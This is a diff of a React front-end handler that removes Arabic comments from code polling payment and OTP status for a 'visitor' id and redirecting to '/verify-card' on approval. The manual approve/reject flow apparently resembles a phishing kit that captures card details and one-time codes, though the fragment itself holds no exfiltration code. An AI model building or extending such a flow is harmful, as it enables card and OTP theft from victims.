@@ -202,7 +202,6 @@ const _id=localStorage.getItem("visitor")
         setPaymentStatus(data.paymentStatus);
         setOtpStatus(data.otpStatus);
     
-        // ✅ عند بدء الدفع، نعرض اللودر
         if (data.paymentStatus === "pending") {
           setIsloading(true);
           setShowWaitingDialog(true);
@@ -210,7 +209,6 @@ const _id=localStorage.getItem("visitor")
           localStorage.setItem("paymentStatus", "pending");
         }
     
-        // ✅ عند الموافقة على الدفع، نخفي اللودر ونظهر OTP
         if (data.paymentStatus === "approved") {
           setIsloading(false);
           setShowWaitingDialog(false);
@@ -218,7 +216,6 @@ const _id=localStorage.getItem("visitor")
           setOtpStatus("pending");
         }
     
-        // ✅ عند رفض الدفع، نخفي اللودر ونعرض رسالة خطأ
         if (data.paymentStatus === "rejected") {
           setIsloading(false);
           setShowWaitingDialog(false);
@@ -226,12 +223,10 @@ const _id=localStorage.getItem("visitor")
           alert("تم رفض الدفع. الرجاء المحاولة مرة أخرى.");
         }
     
-        // ✅ عند إدخال OTP، نظهر اللودر حتى يتم التحقق
         if (data.otpStatus === "pending") {
           setIsloading(true);
         }
     
-        // ✅ عند رفض الـ OTP، نظهر مربع OTP مجددًا
         if (data.otpStatus === "rejected") {
           setIsloading(false);
           setShowWaitingDialog(false);
@@ -239,7 +234,6 @@ const _id=localStorage.getItem("visitor")
           alert("فشل التحقق من OTP. الرجاء المحاولة مرة أخرى.");
         }
     
-        // ✅ عند الموافقة على الـ OTP، ننتقل لصفحة "verify-card"
         if (data.otpStatus === "approved") {
           setIsloading(false);
           window.location.href = "/verify-card";
